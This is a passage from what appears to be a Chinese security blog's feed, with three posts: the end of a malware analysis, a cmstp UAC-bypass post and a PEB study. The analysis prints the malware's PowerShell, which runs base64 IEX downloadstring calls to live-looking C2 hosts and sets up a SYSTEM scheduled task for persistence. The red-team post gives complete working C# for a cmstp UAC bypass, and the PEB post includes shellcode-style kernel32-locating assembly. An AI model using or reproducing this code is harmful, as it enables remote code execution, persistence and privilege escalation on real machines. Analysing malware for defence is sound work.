&quot;&amp;user=&quot; + $env:USERNAME + &quot;&amp;PS=&quot; + $exeflagif($flag -eq &#39;False&#39;){        New-Item $path -type file        if($permit){                try{                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?hig&quot; + $dt + &quot;&#39;)&quot;                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    $bcode = [Convert]::ToBase64String($Bytes)                    $scexec = &quot;/create /ru system /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39; #创建计划任务                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;                }catch{}        }else{                try{                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?low&quot; + $dt + &quot;&#39;)&quot;                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    $bcode = [Convert]::ToBase64String($Bytes)                    $scexec = &quot;/create /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39;                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;                }catch{}        }        &amp;schtasks /run /tn &quot;Winnet&quot; #创建另外个计划任务}else{}sleep (get-random -inputobject (1..20)) #休眠1-20秒try{        $run = Get-WmiObject Win32_Process | select commandline | Select-String -Pattern &quot;downloadstring&quot; #检查进程运行的命令是否带有downloadstring,没有远程下载执行        if(($run.length -lt 0) -and $exeflag){            $onps = &quot;/c powershell -nop -w hidden -ep bypass -c &quot; + &#39;&quot;&#39; + &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;&quot; + &quot;http://188.166.162.201/update.png?&amp;&quot; + $key + &quot;&#39;)&quot; + &#39;&quot;&#39;            Start-Process -FilePath cmd.exe -ArgumentList &quot;$onps&quot;        }else{}}catch{}kill $pid</code></pre><p>IP:188.166.162.201<br>脚本内的某些函数来源于:<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br>原ps1下载地址:<a href="http://188.166.162.201/update.png?mac=&amp;av=" target="_blank" rel="noopener">http://188.166.162.201/update.png?mac=&amp;av=</a>&lt;av_name&gt;&amp;version=&lt;os_version&gt;&amp;bit=&lt;os_arch&gt;&amp;flag2=&amp;domain=<groupname>&amp;user=<username>&amp;PS=False<br>后续下载地址:<a href="http://pslog.estonine.com/logging.php" target="_blank" rel="noopener">http://pslog.estonine.com/logging.php</a> <a href="http://p.estonine.com/p?smb" target="_blank" rel="noopener">http://p.estonine.com/p?smb</a> <a href="http://p.estonine.com/low?ipc" target="_blank" rel="noopener">http://p.estonine.com/low?ipc</a><br>微步查询:<br><a href="https://x.threatbook.cn/nodev4/domain/p.estonine.com" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/domain/p.estonine.com</a><br><a href="https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880" target="_blank" rel="noopener">https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880</a></username></groupname></p><p>update.png MD5:e279958da1c4dc11eb3a77909fce551e</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>能力有限，有没分析出来的见谅</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;下午在群里看见一&lt;code&gt;app.any.run&lt;/code&gt;的链接，没啥事情做分析了一下。做个记录&lt;/p&gt;
&lt;h2 id=&quot;分析过程&quot;&gt;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>cmstp bypassuac研究</title>
    <link href="http://422926799.github.io/posts/d38c8377.html"/>
    <id>http://422926799.github.io/posts/d38c8377.html</id>
    <published>2021-03-04T12:58:58.000Z</published>
    <updated>2021-03-04T13:06:39.281Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.anquanke.com/post/id/86685" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86685</a><br><a href="https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g</a></p><p>对应的powershell脚本:</p><p><a href="https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1" target="_blank" rel="noopener">https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1</a></p><p>测试系统：</p><pre><code>* windows 10* windows 7* windows server 2012* windows server 2008</code></pre><p>C#改造</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Diagnostics;using System.Runtime.InteropServices;using System.Windows.Forms;using System.IO;using System.Threading.Tasks;namespace cmstp_bypassuac{    class Program    {        [DllImport(&quot;user32.dll&quot;, SetLastError = true)]        public static extern bool SetForegroundWindow(IntPtr hWnd);        public static string createinf() {            string filename = &quot;test.inf&quot;;            string command = @&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;;            string data = @&quot;[version]Signature=$chicago$AdvancedINF=2.5[DefaultInstall]CustomDestination=CustInstDestSectionAllUsersRunPreSetupCommands=RunPreSetupCommandsSection[RunPreSetupCommandsSection]; Commands Here will be run Before Setup Begins to install{0}taskkill /IM cmstp.exe /F[CustInstDestSectionAllUsers]49000,49001=AllUSer_LDIDSection, 7[AllUSer_LDIDSection]&quot;&quot;HKLM&quot;&quot;, &quot;&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;&quot;,  &quot;&quot;ProfileInstallPath&quot;&quot;, &quot;&quot; % UnexpectedError % &quot;&quot;, &quot;&quot;&quot;&quot;    [Strings]ServiceName = &quot;&quot;CorpVPN&quot;&quot;ShortSvcName = &quot;&quot;CorpVPN&quot;;            data = string.Format(data, command);            File.WriteAllText(filename, data);            if (File.Exists(filename))            {                Console.WriteLine(&quot;Create Inf File is ok&quot;);                var currentpath = System.IO.Directory.GetCurrentDirectory() +  &quot;\\&quot;+filename;                return currentpath;            }            else {                Console.WriteLine(&quot;Create Inf File Failure...&quot;);                return &quot;&quot;;            }        }        public static IntPtr execute() {            Process[] cmstpdata = Process.GetProcessesByName(&quot;cmstp&quot;); //获取CMSTP线程            if (cmstpdata.Length != 0)            {                cmstpdata[0].Refresh();                var windowhandle = cmstpdata[0].MainWindowHandle;                return windowhandle;            }            else            {                Console.WriteLine(&quot;Not Found cmstp handle,exit....&quot;);                return IntPtr.Zero;            }        }        static void Main(string[] args)        {            string infpath=createinf();            if (infpath.Length != 0)            {                ProcessStartInfo runcmd =new  ProcessStartInfo(&quot;C:\\Windows\\System32\\cmstp.exe&quot;);                runcmd.Arguments = &quot;/au \&quot;&quot;+infpath+&quot;\&quot;&quot;;                runcmd.UseShellExecute = false;                Process.Start(runcmd);                IntPtr windowhandle = execute();                //由于刚刚cmstp进程刚刚创建无法快速获取对应的窗口句柄，使用循环来解决                while (windowhandle == IntPtr.Zero) {                    windowhandle = execute();                }                Console.WriteLine(&quot;The Cmstp Handle:&quot; + windowhandle);                SetForegroundWindow(windowhandle); //将CMSTP窗口调出到前台并激活该窗口                SendKeys.SendWait(&quot;{ENTER}&quot;);                }        }       }}</code></pre><p>效果如下<br><img src="https://s3.ax1x.com/2021/03/04/6Zt5kj.gif" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/86685&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/86685&lt;/a&gt;&lt;br&gt;&lt;a</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>PEB的深入学习</title>
    <link href="http://422926799.github.io/posts/165f8274.html"/>
    <id>http://422926799.github.io/posts/165f8274.html</id>
    <published>2021-02-22T06:26:52.000Z</published>
    <updated>2021-02-22T12:04:03.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>纯属是之前乱弄shellcode编写的时候看见的PEB，然后当时做了笔记。不是很熟悉PEB这个，打算在了解一下。</p><h2 id="PEB是什么"><a href="#PEB是什么" class="headerlink" title="PEB是什么"></a>PEB是什么</h2><blockquote><p>进程环境块（PEB）是 Windows NT操作系统内部使用的数据结构，用以存储每个进程的运行时数据。[1] Microsoft的MSDN文档中仅公开了PEB的少数几个域，该结构“在未来的Windows版本中可能会修改”。[2]PEB包含的数据结构适用于整个进程，如全局上下文，启动参数，程序image装载器的数据结构，程序image的基地址，进程级互斥同步访问对象等。[1]<br>PEB与kernel mode EPROCESS数据结构密切相关。也是逐进程数据结构，在客户-服务器运行时子系统(CSRSS)进程地址空间被管理。但是，类似于CSRSS数据结构，PEB自身并不是内核模式数据结构。它驻留在所关联的进程的用户态内存空间中。这是因为它被设计为被操作系统的用户态的程序所使用，如NTDLL，在内核态之外执行，如程序映象的加载器与堆管理器。[3]<br>WinDbg中，卸载PEB内容的命令是!peb，命令参数是PEB在进程地址空间的地址，它实际上是通过!process命令获取，将显示来自于EPROCESS数据结构的信息，其中一个域是PEB地址。[3]</p></blockquote><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>windbg<br>od<br>vs</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>用汇编写一段寻找PEB地址的指令，然后编译逐渐调试。</p><pre><code class="asm">global _startsection .text    _start:        mov eax,[fs:0x30] ;EAX=PEB        mov eax,[eax+0xc] ;EAX=PEB-&gt;Ldr        mov esi,[eax+0x14] ;ESI=PEB-&gt;Ldr.InMemOrder (Ldr.InMemOrder地址赋到ESI寄存器)        lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址        xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)        lodsd ;EAX=Third(Kernel32)        mov ebx,[eax+0x10] ;EBX=Kernel32基地址        mov edx,[ebx+0x3c] ;EDX = DOS-&gt;e_lfanew (DOS头偏移地址)        add edx,ebx ;PE头地址获取        mov edx,[edx+0x78] ;IMAGE_EXPORT_DIRECTORY        add edx,ebx ;EDX = Export table        mov esi, [edx + 0x20]    ; ESI = Offset namestable        add esi, ebx             ; ESI = Names table        xor ecx, ecx             ; EXC = 0</code></pre><p>yasm和golink编译成exe</p><pre><code>yasm.win32.exe -f win32 -o test.obj test.asmGolink /ni /entry _start shell.obj</code></pre><p>然后拖入windbg调，自动解析PEB<code>!peb</code><br><img src="https://s3.ax1x.com/2021/02/22/y7XI41.png" alt=""></p><ul><li>InheritedAddressSpace: 继承的地址空间</li><li>ReadImageFileExecOptions: 读取文件镜像执行选项</li><li>BeingDebugged: 是否在被调试</li><li>ImageBaseAddress: 镜像基本的地址</li><li>Ldr: (到PEB_LDR_DATA结构的指针，提供被加载模块的信息。)包含kernel32 与ntdll的基地址</li><li>SubSystemData: 子系统数据</li><li>ProcessHeap: 进程堆栈首地址</li><li>ProcessParameters: 进程参数地址</li><li>CurrentDirectory: 当前目录</li><li>WindowTitle: 窗口标题</li><li>ImageFile: 镜像我呢见</li><li>CommandLine: 命令行</li><li>DllPath: DLL路径</li><li>Environment: 环境</li></ul><p>手动解析PEB<code>dt _PEB @$peb</code></p><pre><code class="asm">ntdll!_PEB   +0x000 InheritedAddressSpace : 0 &#39;&#39;   +0x001 ReadImageFileExecOptions : 0 &#39;&#39;   +0x002 BeingDebugged    : 0x1 &#39;&#39;   +0x003 BitField         : 0 &#39;&#39;   +0x003 ImageUsesLargePages : 0y0   +0x003 IsProtectedProcess : 0y0   +0x003 IsImageDynamicallyRelocated : 0y0   +0x003 SkipPatchingUser32Forwarders : 0y0   +0x003 IsPackagedProcess : 0y0   +0x003 IsAppContainer   : 0y0   +0x003 IsProtectedProcessLight : 0y0   +0x003 IsLongPathAwareProcess : 0y0   +0x004 Mutant           : 0xffffffff Void   +0x008 ImageBaseAddress : 0x00400000 Void   +0x00c Ldr              : 0x7750dca0 _PEB_LDR_DATA   +0x010 ProcessParameters : 0x004b1d38 _RTL_USER_PROCESS_PARAMETERS   +0x014 SubSystemData    : (null)    +0x018 ProcessHeap      : 0x004b0000 Void   +0x01c FastPebLock      : 0x7750da60 _RTL_CRITICAL_SECTION   +0x020 AtlThunkSListPtr : (null)    +0x024 IFEOKey          : (null)    +0x028 CrossProcessFlags : 3   +0x028 ProcessInJob     : 0y1   +0x028 ProcessInitializing : 0y1   +0x028 ProcessUsingVEH  : 0y0   +0x028 ProcessUsingVCH  : 0y0   +0x028 ProcessUsingFTH  : 0y0   +0x028 ProcessPreviouslyThrottled : 0y0   +0x028 ProcessCurrentlyThrottled : 0y0   +0x028 ProcessImagesHotPatched : 0y0   +0x028 ReservedBits0    : 0y000000000000000000000000 (0)   +0x02c KernelCallbackTable : (null)    +0x02c UserSharedInfoPtr : (null)    +0x030 SystemReserved   : 0   +0x034 AtlThunkSListPtr32 : (null)    +0x038 ApiSetMap        : 0x00040000 Void   +0x03c TlsExpansionCounter : 0   +0x040 TlsBitmap        : 0x7750dc50 Void   +0x044 TlsBitmapBits    : [2] 0x10001   +0x04c ReadOnlySharedMemoryBase : 0x7fe40000 Void   +0x050 SharedData       : (null)    +0x054 ReadOnlyStaticServerData : 0x7fe40750  -&gt; (null)    +0x058 AnsiCodePageData : 0x7ffa0000 Void   +0x05c OemCodePageData  : 0x7ffa0000 Void   +0x060 UnicodeCaseTableData : 0x7ffd0028 Void   +0x064 NumberOfProcessors : 0xc   +0x068 NtGlobalFlag     : 0x70   +0x070 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000   +0x078 HeapSegmentReserve : 0x100000   +0x07c HeapSegmentCommit : 0x2000   +0x080 HeapDeCommitTotalFreeThreshold : 0x10000   +0x084 HeapDeCommitFreeBlockThreshold : 0x1000   +0x088 NumberOfHeaps    : 1   +0x08c MaximumNumberOfHeaps : 0x10   +0x090 ProcessHeaps     : 0x7750c760  -&gt; 0x004b0000 Void   +0x094 GdiSharedHandleTable : (null)    +0x098 ProcessStarterHelper : (null)    +0x09c GdiDCAttributeList : 0   +0x0a0 LoaderLock       : 0x7750b3d0 _RTL_CRITICAL_SECTION   +0x0a4 OSMajorVersion   : 0xa   +0x0a8 OSMinorVersion   : 0   +0x0ac OSBuildNumber    : 0x47bb   +0x0ae OSCSDVersion     : 0   +0x0b0 OSPlatformId     : 2   +0x0b4 ImageSubsystem   : 2   +0x0b8 ImageSubsystemMajorVersion : 4   +0x0bc ImageSubsystemMinorVersion : 0   +0x0c0 ActiveProcessAffinityMask : 0xfff   +0x0c4 GdiHandleBuffer  : [34] 0   +0x14c PostProcessInitRoutine : (null)    +0x150 TlsExpansionBitmap : 0x7750dc38 Void   +0x154 TlsExpansionBitmapBits : [32] 1   +0x1d4 SessionId        : 1   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER 0x0   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0   +0x1e8 pShimData        : 0x001b0000 Void   +0x1ec AppCompatInfo    : (null)    +0x1f0 CSDVersion       : _UNICODE_STRING &quot;&quot;   +0x1f8 ActivationContextData : (null)    +0x1fc ProcessAssemblyStorageMap : (null)    +0x200 SystemDefaultActivationContextData : 0x001a0000 _ACTIVATION_CONTEXT_DATA   +0x204 SystemAssemblyStorageMap : (null)    +0x208 MinimumStackCommit : 0   +0x20c SparePointers    : [4] (null)    +0x21c SpareUlongs      : [5] 0   +0x230 WerRegistrationData : (null)    +0x234 WerShipAssertPtr : (null)    +0x238 pUnused          : (null)    +0x23c pImageHeaderHash : (null)    +0x240 TracingFlags     : 0   +0x240 HeapTracingEnabled : 0y0   +0x240 CritSecTracingEnabled : 0y0   +0x240 LibLoaderTracingEnabled : 0y0   +0x240 SpareTracingBits : 0y00000000000000000000000000000 (0)   +0x248 CsrServerReadOnlySharedMemoryBase : 0x00007df4`2f970000   +0x250 TppWorkerpListLock : 0   +0x254 TppWorkerpList   : _LIST_ENTRY [ 0x276254 - 0x276254 ]   +0x25c WaitOnAddressHashTable : [128] (null)    +0x45c TelemetryCoverageHeader : (null)    +0x460 CloudFileFlags   : 0x60   +0x464 CloudFileDiagFlags : 0   +0x468 PlaceholderCompatibilityMode : 1 &#39;&#39;   +0x469 PlaceholderCompatibilityModeReserved : [7]  &quot;&quot;   +0x470 LeapSecondData   : 0x7ff90000 _LEAP_SECOND_DATA   +0x474 LeapSecondFlags  : 0   +0x474 SixtySecondEnabled : 0y0   +0x474 Reserved         : 0y0000000000000000000000000000000 (0)   +0x478 NtGlobalFlag2    : 0</code></pre><p>这里比较重要的是Ldr,(PEB_LDR_DATA结构的指针，提供被加载模块的信息。)</p><p>Ldr分析<br><img src="https://s3.ax1x.com/2021/02/22/yHnGZj.png" alt=""></p><pre><code class="asm">   +0x000 Length           : 0x30   +0x004 Initialized      : 0x1 &#39;&#39;   +0x008 SsHandle         : (null)    +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x4b3720 - 0x4b3d30 ]  //按加载顺序   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x4b3728 - 0x4b3d38 ] //按内存顺序   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x4b3628 - 0x4b3d40 ] //按初始化顺序   +0x024 EntryInProgress  : (null)    +0x028 ShutdownInProgress : 0 &#39;&#39;   +0x02c ShutdownThreadId : (null) </code></pre><p>InLoadOrderModuleList、InMemoryOrderModuleList、InMemoryOrderModuleList这三个是双向链表<br>(其实三个都一样，顺序不同而已)<br>对应的格式为 LIST_ENTRY</p><pre><code class="asm">0:000&gt; dt _LIST_ENTRYntdll!_LIST_ENTRY   +0x000 Flink            : Ptr32 _LIST_ENTRY   +0x004 Blink            : Ptr32 _LIST_ENTRY</code></pre><p><strong>LDR_DATA_TABLE_ENTRY structure,双向循环链表</strong>吧，从一个方向开始，不停的循环，就回到初始位了，就相当于遍历了一次</p><p>结构如下</p><pre><code class="asm">0:000&gt; dt _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY   +0x008 InMemoryOrderLinks : _LIST_ENTRY   +0x010 InInitializationOrderLinks : _LIST_ENTRY   +0x018 DllBase          : Ptr32 Void   +0x01c EntryPoint       : Ptr32 Void   +0x020 SizeOfImage      : Uint4B   +0x024 FullDllName      : _UNICODE_STRING   +0x02c BaseDllName      : _UNICODE_STRING   +0x034 FlagGroup        : [4] UChar   +0x034 Flags            : Uint4B   +0x034 PackagedBinary   : Pos 0, 1 Bit   +0x034 MarkedForRemoval : Pos 1, 1 Bit   +0x034 ImageDll         : Pos 2, 1 Bit   +0x034 LoadNotificationsSent : Pos 3, 1 Bit   +0x034 TelemetryEntryProcessed : Pos 4, 1 Bit   +0x034 ProcessStaticImport : Pos 5, 1 Bit   +0x034 InLegacyLists    : Pos 6, 1 Bit   +0x034 InIndexes        : Pos 7, 1 Bit   +0x034 ShimDll          : Pos 8, 1 Bit   +0x034 InExceptionTable : Pos 9, 1 Bit   +0x034 ReservedFlags1   : Pos 10, 2 Bits   +0x034 LoadInProgress   : Pos 12, 1 Bit   +0x034 LoadConfigProcessed : Pos 13, 1 Bit   +0x034 EntryProcessed   : Pos 14, 1 Bit   +0x034 ProtectDelayLoad : Pos 15, 1 Bit   +0x034 ReservedFlags3   : Pos 16, 2 Bits   +0x034 DontCallForThreads : Pos 18, 1 Bit   +0x034 ProcessAttachCalled : Pos 19, 1 Bit   +0x034 ProcessAttachFailed : Pos 20, 1 Bit   +0x034 CorDeferredValidate : Pos 21, 1 Bit   +0x034 CorImage         : Pos 22, 1 Bit   +0x034 DontRelocate     : Pos 23, 1 Bit   +0x034 CorILOnly        : Pos 24, 1 Bit   +0x034 ChpeImage        : Pos 25, 1 Bit   +0x034 ReservedFlags5   : Pos 26, 2 Bits   +0x034 Redirected       : Pos 28, 1 Bit   +0x034 ReservedFlags6   : Pos 29, 2 Bits   +0x034 CompatDatabaseProcessed : Pos 31, 1 Bit   +0x038 ObsoleteLoadCount : Uint2B   +0x03a TlsIndex         : Uint2B   +0x03c HashLinks        : _LIST_ENTRY   +0x044 TimeDateStamp    : Uint4B   +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT   +0x04c Lock             : Ptr32 Void   +0x050 DdagNode         : Ptr32 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY   +0x05c LoadContext      : Ptr32 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : Ptr32 Void   +0x064 SwitchBackContext : Ptr32 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : Uint4B   +0x088 LoadTime         : _LARGE_INTEGER   +0x090 BaseNameHashValue : Uint4B   +0x094 LoadReason       : _LDR_DLL_LOAD_REASON   +0x098 ImplicitPathOptions : Uint4B   +0x09c ReferenceCount   : Uint4B   +0x0a0 DependentLoadFlags : Uint4B   +0x0a4 SigningLevel     : UChar</code></pre><p>跟上面的汇编一样找InMemoryOrderModuleList来遍历<code>0x4b3728 - 0x4b3d38</code>这个地址范围里存着对应的内存顺序载入过程</p><pre><code class="asm">0:000&gt; dt 0x4b3728 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3620 - 0x7750dcb4 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x400000 - 0x401000 ]   +0x018 DllBase          : 0x00002000 Void   +0x01c EntryPoint       : 0x00620060 Void   +0x020 SizeOfImage      : 0x4b21fc   +0x024 FullDllName      : _UNICODE_STRING &quot;test.exe&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;P???&quot;   +0x034 Flags            : 0x7750db50   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb50   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x6032501a - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b37e0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b37e0 Void   +0x050 DdagNode         : 0x004b37e0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x19fa64 - 0x0 ]   +0x05c LoadContext      : 0x773f1124 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : (null)    +0x064 SwitchBackContext : 0x004b3d98 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`33df1536   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;</code></pre><p>然后通过不断遍历链表元素里的InLoadOrderLinks，最后找到kernel32.dll</p><pre><code class="asm">0:000&gt; dt 0x4b3728 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3620 - 0x7750dcb4 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x400000 - 0x401000 ]   +0x018 DllBase          : 0x00002000 Void   +0x01c EntryPoint       : 0x00620060 Void   +0x020 SizeOfImage      : 0x4b21fc   +0x024 FullDllName      : _UNICODE_STRING &quot;test.exe&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;P???&quot;   +0x034 Flags            : 0x7750db50   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y1   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb50   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x6032501a - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b37e0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b37e0 Void   +0x050 DdagNode         : 0x004b37e0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x19fa64 - 0x0 ]   +0x05c LoadContext      : 0x773f1124 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : (null)    +0x064 SwitchBackContext : 0x004b3d98 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`33df1536   +0x090 BaseNameHashValue : 0   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;0:000&gt; dt 0x4b3620 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4b3b08 - 0x4b3728 ]   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4b3ed0 - 0x7750dcbc ]   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x773f0000 - 0x0 ]   +0x018 DllBase          : 0x0019a000 Void   +0x01c EntryPoint       : 0x003c003a Void   +0x020 SizeOfImage      : 0x4b34f8   +0x024 FullDllName      : _UNICODE_STRING &quot;ntdll.dll&quot;   +0x02c BaseDllName      : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot;   +0x034 FlagGroup        : [4]  &quot;@???&quot;   +0x034 Flags            : 0x7750db40   +0x034 PackagedBinary   : 0y0   +0x034 MarkedForRemoval : 0y0   +0x034 ImageDll         : 0y0   +0x034 LoadNotificationsSent : 0y0   +0x034 TelemetryEntryProcessed : 0y0   +0x034 ProcessStaticImport : 0y0   +0x034 InLegacyLists    : 0y1   +0x034 InIndexes        : 0y0   +0x034 ShimDll          : 0y1   +0x034 InExceptionTable : 0y1   +0x034 ReservedFlags1   : 0y10   +0x034 LoadInProgress   : 0y1   +0x034 LoadConfigProcessed : 0y0   +0x034 EntryProcessed   : 0y1   +0x034 ProtectDelayLoad : 0y1   +0x034 ReservedFlags3   : 0y00   +0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 